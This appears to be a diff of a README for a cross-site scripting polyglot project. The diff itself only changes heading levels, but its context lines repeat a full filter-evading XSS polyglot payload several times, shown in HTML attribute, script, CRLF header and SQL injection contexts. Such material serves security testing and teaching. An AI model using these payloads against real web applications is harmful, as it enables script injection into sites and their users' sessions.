@@ -25,7 +25,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 __Total length: 144 characters.__
 
 ## What injection contexts does it cover?
-#### HTML contexts covered:
+### HTML contexts covered:
 * __Double-quoted tag attributes:__
 ```html
 <input type="text" value="
@@ -127,7 +127,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 </div>
 ```
 _Demo: <https://jsbin.com/wuvumuh>_
-#### Script contexts covered:
+### Script contexts covered:
 * __Double-quoted strings:__
 ```javascript
 
@@ -175,7 +175,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 </script>
 ```
 _Demo: <https://jsbin.com/vovogo>_
-##### _JS sinks_:
+#### JS sinks:
 * __`eval`:__
 ````javascript
 
@@ -271,7 +271,7 @@ preg_replace('/<\w+\s+/', '', PAYLOAD);
 ```
 
 ## Bonus attacking contexts covered:
-#### CRLF-based XSS:
+### CRLF-based XSS:
 ````http
 
 HTTP/1.1 200 OK
@@ -282,7 +282,7 @@ Set-Cookie: x=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
 //</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 
 ````
-#### Error-based SQL injections (yes, SQLi!):
+### Error-based SQL injections (yes, SQLi!):
 ````sql
 
 SELECT * FROM Users WHERE Username='jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'
